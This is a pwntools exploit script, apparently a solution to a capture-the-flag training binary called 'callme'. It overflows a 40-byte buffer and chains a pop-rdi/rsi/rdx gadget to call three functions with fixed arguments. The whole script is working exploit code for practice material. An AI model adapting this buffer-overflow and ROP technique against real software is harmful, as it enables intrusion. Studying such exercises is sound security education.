import pwn

#pwn.context.log_level = "debug"
pwn.context.arch = 'amd64'
remote = False

IP = ""
PORT = ""
FILENAME = "./callme"

if remote:
    p = pwn.remote(IP, PORT)
    elf = pwn.ELF(FILENAME)
else:
    p = pwn.process(FILENAME)
    elf = p.elf

p.recvuntil("> ")
triple_pop = 0x000000000040093c # pop rdi; pop rsi; pop rdx; ret;


callme_one = elf.sym['callme_one']
callme_two = elf.sym['callme_two']
callme_three = elf.sym['callme_three']

payload = b"A"*40 +\
          pwn.p64(triple_pop) +\
          pwn.p64(0xdeadbeefdeadbeef) +\
          pwn.p64(0xcafebabecafebabe) +\
          pwn.p64(0xd00df00dd00df00d) +\
          pwn.p64(callme_one) +\
          pwn.p64(triple_pop) +\
          pwn.p64(0xdeadbeefdeadbeef) +\
          pwn.p64(0xcafebabecafebabe) +\
          pwn.p64(0xd00df00dd00df00d) +\
          pwn.p64(callme_two) +\
          pwn.p64(triple_pop) +\
          pwn.p64(0xdeadbeefdeadbeef) +\
          pwn.p64(0xcafebabecafebabe) +\
          pwn.p64(0xd00df00dd00df00d) +\
          pwn.p64(callme_three)

p.sendline(payload)

# using pwn.ROP()
#rop = pwn.ROP(elf)
#rop.call(callme_one, [0xdeadbeefdeadbeef, 0xcafebabecafebabe, 0xd00df00dd00df00d])
#rop.call(callme_two, [0xdeadbeefdeadbeef, 0xcafebabecafebabe, 0xd00df00dd00df00d])
#rop.call(callme_three, [0xdeadbeefdeadbeef, 0xcafebabecafebabe, 0xd00df00dd00df00d])
#payload = b"A"*40 + rop.chain()
#p.sendline(payload)

p.interactive()
